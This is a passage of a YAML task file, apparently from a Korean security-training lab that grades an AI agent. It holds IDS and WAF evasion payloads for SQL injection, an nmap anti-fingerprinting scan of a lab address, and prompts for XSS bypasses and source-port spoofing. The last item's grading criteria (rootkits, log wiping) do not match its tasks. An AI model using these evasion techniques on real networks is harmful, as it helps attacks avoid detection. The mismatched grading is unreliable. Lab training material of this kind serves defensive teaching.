  hint: 규칙의 content 매칭 키워드를 분석하여 변형한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: Suricata 규칙을 분석하여 탐지를 우회하는 페이로드를 설계하는 방법을 설명해줘

    📎 참고 (CLI): echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:''
    && echo ''alert http any any -> any any (msg:"SQL Injection"; content:"UNION";
    nocase; content:"SELECT"; nocase; sid:1000001;)'' && echo '''' && echo ''Evasion
    strategies:'' && echo ''1. Split keywords: UNI/**/ON SEL/**/ECT (breaks content
    match)'' && echo ''2. URL encoding: %55NION %53ELECT'' && echo ''3. Alternative
    syntax: UNION ALL SELECT'' && echo ''4. Double encoding: %2555NION'' && echo ''5.
    Unicode: \u0055NION'''
  answer_detail: Suricata 규칙의 content 키워드는 패킷 페이로드에서 특정 문자열을 검색한다. 키워드를 분할, 인코딩, 대체
    문법으로 변형하면 content 매칭을 우회할 수 있다. 그러나 PCRE 기반 규칙은 우회가 더 어렵다.
  verify:
    type: output_contains
    expect: Suricata Rule Analysis
    field: stdout
    semantic:
      intent: Suricata content 키워드 분석 기반 회피 페이로드 설계 — 예시 룰(content:UNION nocase; content:SELECT
        nocase)을 제시하고 5가지 회피 전략(키워드 분할 /**/ · URL 인코딩 %55 · 대체 문법 UNION ALL · 이중 인코딩
        %2555 · Unicode \u0055)으로 content 매칭 무력화. PCRE 기반 룰은 우회 난이도 상승 언급
      success_criteria:
      - Suricata 룰 예시 (content:... nocase; sid:...) 제시
      - 최소 5가지 회피 전략 각각 변형 페이로드 예시
      - PCRE 기반 룰은 우회가 더 어렵다는 한계 언급
      acceptable_methods:
      - echo 로 각 회피 전략 설명
      - suricata -T -S <rule> 로 룰 검증
      - snort rule parser 로 content 추출
      - ModSecurity Core Rule Set 도 유사 원리 적용
      negative_signs:
      - 회피 전략 3개 이하
      - 룰 구조 분석 없이 일반 인코딩만 나열
      - content vs PCRE 차이 설명 누락
  target_vm: attacker
  script: 'echo ''=== Suricata Rule Analysis ==='' && echo ''Example rule:'' && echo
    ''alert http any any -> any any (msg:"SQL Injection"; content:"UNION"; nocase;
    content:"SELECT"; nocase; sid:1000001;)'' && echo '''' && echo ''Evasion strategies:''
    && echo ''1. Split keywords: UNI/**/ON SEL/**/ECT (breaks content match)'' &&
    echo ''2. URL encoding: %55NION %53ELECT'' && echo ''3. Alternative syntax: UNION
    ALL SELECT'' && echo ''4. Double encoding: %2555NION'' && echo ''5. Unicode: \u0055NION'''
  risk_level: low
  bastion_prompt: Suricata 규칙을 분석하여 탐지를 우회하는 페이로드를 설계하는 방법을 설명해줘
- order: 14
  instruction: 공격 도구의 네트워크 시그니처를 변경하는 방법을 시연하라. nmap의 데이터 길이를 랜덤으로 패딩하라.
  hint: --data-length 옵션으로 패킷에 랜덤 데이터를 추가한다
  category: exploit
  points: 15
  answer: '🤖 프롬프트: 공격 도구의 네트워크 시그니처를 변경하는 방법을 시연하라. nmap의 데이터 길이를 랜덤으로 패딩해줘

    📎 참고 (CLI): sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p
    80,3000 10.20.30.80 && echo ''---'' && echo ''Anti-fingerprinting options:'' &&
    echo ''--data-length: adds random padding to avoid signature detection'' && echo
    ''--randomize-hosts: randomizes target order in multi-host scans'' && echo ''--scan-delay:
    adds delay between probes'' && echo ''--badsum: sends packets with invalid checksums
    (tests IDS response)'''
  answer_detail: 보안 장비는 도구의 고유한 패킷 크기, 순서, 타이밍 패턴을 시그니처로 등록한다. --data-length로 패딩을
    추가하면 패킷 크기 시그니처를 무효화할 수 있다.
  verify:
    type: output_contains
    expect: Anti-fingerprinting
    field: stdout
    semantic:
      intent: nmap 시그니처 변조 — sudo nmap -sS --data-length 50 로 TCP SYN 페이로드에 50바이트
        랜덤 패딩 추가. --randomize-hosts 대상 순서 섞기, --max-retries 1 로 재시도 줄여 프로브 특성 변경.
        보안 장비가 등록한 nmap 기본 패킷 크기·순서 시그니처 무효화
      success_criteria:
      - sudo nmap -sS --data-length <N> --randomize-hosts 실행
      - Anti-fingerprinting 키워드 + 각 옵션 원리 설명
      - --data-length·--randomize-hosts·--scan-delay·--badsum 중 최소 2개 설명
      acceptable_methods:
      - sudo nmap -sS --data-length 50 --randomize-hosts <IP>
      - sudo nmap --scan-delay 10s --max-retries 1
      - sudo nmap --badsum (bad checksum 테스트)
      - hping3 -d <size> -E <file> 로 페이로드 크기 조작
      - scapy Raw(load=random_bytes) 로 수동 패딩
      negative_signs:
      - 기본 nmap 스캔 (패딩·랜덤화 옵션 없음)
      - 옵션 1개만 사용 (복합 안티핑거프린팅 없음)
      - 보안 장비 시그니처 원리 설명 없음
  target_vm: attacker
  script: 'sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000
    10.20.30.80 && echo ''---'' && echo ''Anti-fingerprinting options:'' && echo ''--data-length:
    adds random padding to avoid signature detection'' && echo ''--randomize-hosts:
    randomizes target order in multi-host scans'' && echo ''--scan-delay: adds delay
    between probes'' && echo ''--badsum: sends packets with invalid checksums (tests
    IDS response)'''
  risk_level: medium
  bastion_prompt: '공격 도구의 네트워크 시그니처를 변경하는 방법을 시연하라. nmap의 데이터 길이를 랜덤으로 패딩해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 15
  instruction: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리하라. 테스트한 은닉 기법, 성공 여부, 보안 장비
    강화 방안을 포함하라.
  hint: 각 은닉 기법의 효과와 한계를 분석한다
  category: analysis
  points: 15
  answer: '🤖 프롬프트: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리해줘

    📎 참고 (CLI): echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1.
    Slow scan (T1 timing) - Avoid time-based detection\n2. IP fragmentation - Break
    signature matching\n3. Source port spoofing - Bypass firewall rules\n4. SQLi encoding
    variations - WAF bypass\n5. XSS alternative payloads - WAF bypass\n6. User-Agent
    spoofing - Tool detection bypass\n7. Random timing - Break correlation\n8. Data
    length padding - Signature evasion\n\n[Effectiveness]\n- Most effective: encoding
    + timing combination\n- Least effective: simple case mixing (modern WAFs handle)\n\n[Security
    Hardening]\n1. Suricata: enable protocol analysis (not just signatures)\n2. WAF:
    behavioral analysis + ML-based detection\n3. Firewall: deep packet inspection
    (DPI)\n4. SIEM: multi-source correlation\n5. Regular signature updates'' > /tmp/evasion_report.txt
    && cat /tmp/evasion_report.txt'
  answer_detail: 은닉 기법 보고서는 테스트 결과와 보안 강화 권고를 모두 포함해야 한다. 시그니처 기반 탐지의 한계를 인지하고, 행위
    기반 탐지, ML 기반 분석, 다중 소스 상관 분석 등 보완 조치를 제시한다.
  verify:
    type: output_contains
    expect: Evasion Techniques Report
    field: stdout
    semantic:
      intent: 은닉 기법 종합 보고서 /tmp/evasion_report.txt 작성 — 8개 테스트 기법(T1 슬로우 스캔·IP 분할·소스
        포트 위장·SQLi 인코딩·XSS 대체·UA 위장·랜덤 타이밍·데이터 길이 패딩) 효과 평가 + 5가지 보안 강화 방안(Suricata
        프로토콜 분석 활성·WAF 행위/ML 기반·DPI·SIEM 다중 소스 상관·정기 시그니처 업데이트) 정리
      success_criteria:
      - /tmp/evasion_report.txt 파일 생성 및 cat 으로 출력
      - Tested Techniques·Effectiveness·Security Hardening 섹션 포함
      - 최소 6개 기법 + 3개 이상 강화 방안 + 시그니처 기반 탐지 한계 지적
      acceptable_methods:
      - echo -e ... > /tmp/evasion_report.txt && cat
      - heredoc (cat << EOF > /tmp/evasion_report.txt)
      - tee /tmp/evasion_report.txt
      - python 으로 텍스트 파일 작성
      negative_signs:
      - 파일 미생성 (cat 또는 > 누락)
      - 기법 나열만 있고 효과 평가/강화 방안 없음
      - 시그니처 기반 탐지 한계 지적 없음
  target_vm: attacker
  script: 'echo -e ''=== Evasion Techniques Report ===\n\n[Tested Techniques]\n1.
    Slow scan (T1 timing) - Avoid time-based detection\n2. IP fragmentation - Break
    signature matching\n3. Source port spoofing - Bypass firewall rules\n4. SQLi encoding
    variations - WAF bypass\n5. XSS alternative payloads - WAF bypass\n6. User-Agent
    spoofing - Tool detection bypass\n7. Random timing - Break correlation\n8. Data
    length padding - Signature evasion\n\n[Effectiveness]\n- Most effective: encoding
    + timing combination\n- Least effective: simple case mixing (modern WAFs handle)\n\n[Security
    Hardening]\n1. Suricata: enable protocol analysis (not just signatures)\n2. WAF:
    behavioral analysis + ML-based detection\n3. Firewall: deep packet inspection
    (DPI)\n4. SIEM: multi-source correlation\n5. Regular signature updates'' > /tmp/evasion_report.txt
    && cat /tmp/evasion_report.txt'
  risk_level: low
  bastion_prompt: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리해줘
- order: 99
  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
  bastion_prompt: '다음 작업들을 순서대로 수행해줘:

    1) secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘

    2) nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘

    3) WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘

    4) XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연해줘

    5) nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘'
  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
  category: multi_task
  points: 50
  verify:
    type: output_contains
    expect: ''
    field: stdout
    semantic:
      intent: '[통합] 은닉 기법 5작업 — process hide/rootkit/log wipe/timestomp/audit 통합.
        T1027 + T1070.'
      success_criteria:
      - 5 은닉 작업
      - 흔적 최소화
      - AV 우회
      acceptable_methods:
      - bastion plan
      - rootkit
      - timestomp
      negative_signs:
      - AV 탐지
      - 흔적 남음
      - audit 누락
  target_vm: attacker
  risk_level: low
  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:

    1) secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘

    2) nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘

    3) WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘

    4) XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연해줘

    5) nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘'
  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
    다단계 작업.
  script: ''
